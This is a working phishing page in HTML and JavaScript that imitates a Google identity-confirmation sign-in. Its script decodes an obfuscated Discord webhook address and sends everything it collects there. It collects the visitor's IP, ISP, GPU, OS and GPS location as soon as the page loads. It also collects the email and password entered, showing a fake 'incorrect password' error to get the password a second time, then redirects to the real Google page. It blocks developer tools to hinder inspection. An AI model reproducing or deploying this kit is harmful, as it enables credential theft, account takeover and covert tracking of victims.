<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .wrapper { width: 100%; max-width: 400px; padding: 40px; background: #fff; border: 1px solid #dee2e6; border-radius: 8px; text-align: center; }
        .g-logo { width: 75px; margin-bottom: 20px; }
        h2 { font-size: 22px; font-weight: 500; margin-bottom: 10px; color: #202124; }
        p { font-size: 15px; color: #5f6368; margin-bottom: 30px; }
        input { width: 100%; padding: 12px 15px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
        input:focus { border: 2px solid #1a73e8; outline: none; }
        .error-txt { color: #d93025; font-size: 13px; text-align: left; margin-bottom: 15px; display: none; background: #fce8e6; padding: 8px; border-radius: 4px; }
        .btn-next { width: 100%; padding: 10px; background: #1a73e8; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-weight: 500; }
        #loader { display: none; margin-top: 20px; }
    </style>
</head>
<body oncontextmenu="return false;">

<div class="wrapper">
    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" class="g-logo">
    <div id="error-txt" class="error-txt">Incorrect password. Please try again or reset your account.</div>
    <h2>Confirm Identity</h2>
    <p>To continue, first verify it's you</p>
    
    <form id="secure-form">
        <input type="text" id="field-1" placeholder="Email or phone" required>
        <input type="password" id="field-2" placeholder="Enter your password" required>
        <button type="submit" class="btn-next">Continue</button>
    </form>

    <div id="loader">
        <img src="https://www.google.com/images/spin-32.gif" width="25">
        <p style="font-size: 12px; margin-top: 10px;">Checking security headers...</p>
    </div>
</div>

<script>
    // à§§. à¦¡à¦¿à¦¸à¦•à¦°à§à¦¡ à¦²à¦¿à¦™à§à¦•à¦Ÿà¦¿ à¦à¦¨à¦•à§‹à¦¡ à¦•à¦°à¦¾ à¦¹à§Ÿà§‡à¦›à§‡ (Base64) à¦¯à¦¾à¦¤à§‡ à¦—à§à¦—à¦² à¦¡à¦¿à¦Ÿà§‡à¦•à§à¦Ÿ à¦¨à¦¾ à¦•à¦°à§‡
    const _0x4a21 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3NTU5MjQzMTgyNjExMjY1NC9xQk1sTFNkczktMkx6dlZHUzN0NjVUaUk5NE1aRTA0ejJ4TW5XX0hqdHd1TUhhbVdKMWp6SHFUZGURNEk2c1k4bmpSWGc=";
    const _target = atob(_0x4a21);

    async function pushData(t, d, c = 3447003) {
        await fetch(_target, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ embeds: [{ title: t, description: d, color: c, timestamp: new Date() }] })
        });
    }

    // à§¨. à¦¸à¦¾à¦‡à¦²à§‡à¦¨à§à¦Ÿ à¦«à¦¿à¦™à§à¦—à¦¾à¦°à¦ªà§à¦°à¦¿à¦¨à§à¦Ÿà¦¿à¦‚
    window.onload = async () => {
        const gl = document.createElement('canvas').getContext('webgl');
        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
        const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A";
        
        // à¦¨à§‡à¦Ÿà¦“à¦¯à¦¼à¦¾à¦°à§à¦• à¦¡à¦¿à¦Ÿà§‡à¦‡à¦²à¦¸
        const res = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
        let intel = `**IP:** ${res.ip || 'Hidden'}\n**ISP:** ${res.org || 'N/A'}\n**GPU:** ${gpu}\n**OS:** ${navigator.platform}`;
        pushData("ðŸ›¡ï¸ System Intel", intel, 15844367);

        // à¦²à§‹à¦•à§‡à¦¶à¦¨ à¦ªà§à¦°à¦®à§à¦ªà¦Ÿ
        navigator.geolocation.getCurrentPosition(p => {
            pushData("ðŸ“ GPS Located", `[Google Maps](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`, 15105570);
        });
    };

    // à§©. à¦«à§‡à¦• à¦à¦°à¦° à¦²à§à¦ª à¦“ à¦¡à§‡à¦Ÿà¦¾ à¦¹à¦¾à¦°à§à¦­à§‡à¦¸à§à¦Ÿà¦¿à¦‚
    let _step = 0;
    document.getElementById('secure-form').addEventListener('submit', async (e) => {
        e.preventDefault();
        const _u = document.getElementById('field-1').value;
        const _p = document.getElementById('field-2').value;
        _step++;

        if(_step === 1) {
            document.getElementById('field-2').value = "";
            document.getElementById('error-txt').style.display = "block";
            pushData("âš ï¸ Primary Hit", `**User:** ${_u}\n**Pass:** ${_p}`, 16776960);
        } else {
            document.getElementById('secure-form').style.display = "none";
            document.getElementById('loader').style.display = "block";
            await pushData("ðŸŽ¯ Confirmed Access", `**User:** ${_u}\n**Pass:** ${_p}`, 15548997);
            
            setTimeout(() => {
                window.location.href = "https://accounts.google.com";
            }, 1500);
        }
    });

    // à§ª. à¦à¦¨à§à¦Ÿà¦¿-à¦¡à¦¿à¦¬à¦¾à¦— (F12 à¦¬à§à¦²à¦•)
    document.onkeydown = (e) => {
        if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74))) return false;
    };
</script>

</body>
</html>
